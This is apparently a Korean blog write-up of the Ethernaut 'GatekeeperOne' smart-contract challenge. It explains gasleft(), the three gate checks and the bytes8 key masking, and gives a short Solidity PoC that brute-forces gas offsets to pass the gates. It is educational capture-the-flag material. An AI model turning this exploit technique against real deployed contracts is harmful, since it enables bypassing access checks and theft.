# The Ethernaut : GatekeeperOne

> [Blog 원문](https://velog.io/@sane100400/The-Ethernaut-GatekeeperOne)

## 핵심 개념

### `gasleft()`

실행 중 남은 가스 양을 반환하는 함수. EVM은 각 연산마다 가스를 소비하므로, 특정 체크포인트에서 남은 가스는:

> gate2에서의 가스 = 제공된 가스 - 오버헤드

오버헤드는 CALL 연산, 함수 진입/디코딩, 컴파일러 생성 명령어에서 누적되어, 환경별 정확한 계산이 어렵다.

## 챌린지 구조

컨트랙트가 세 개의 modifier로 보안 게이트를 구현:

1. **gateOne**: `msg.sender != tx.origin` (다른 컨트랙트를 통해 호출 필요)
2. **gateTwo**: `gasleft() % 8191 == 0` (남은 가스가 8191로 나누어 떨어져야 함)
3. **gateThree**: bytes8 키에 대한 세 가지 검증

## GateThree 바이트 분석

`_gateKey` 매개변수가 세 가지 조건을 동시에 만족해야 한다:

- **조건 1**: uint32 변환 결과 == uint16 변환 결과 (하위 4바이트의 상위 2바이트가 0)
- **조건 2**: uint32 형태 != uint64 형태 (상위 4바이트가 모두 0이면 안 됨)
- **조건 3**: 하위 2바이트 == `tx.origin`의 하위 2바이트

**해법 공식:**
```solidity
bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF
```

## PoC

```solidity
function attack() external {
    gatekey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

    for (uint256 i = 0; i < 300; i++) {
        (bool success, ) = address(gatekeeperone).call{gas: 8191 * 5 + i}(
            abi.encodeWithSignature("enter(bytes8)", gatekey)
        );
        if (success) return;
    }
}
```

가스 오프셋을 반복하여 환경별 오버헤드 비용의 차이를 보정하는 브루트포스 방식이다.
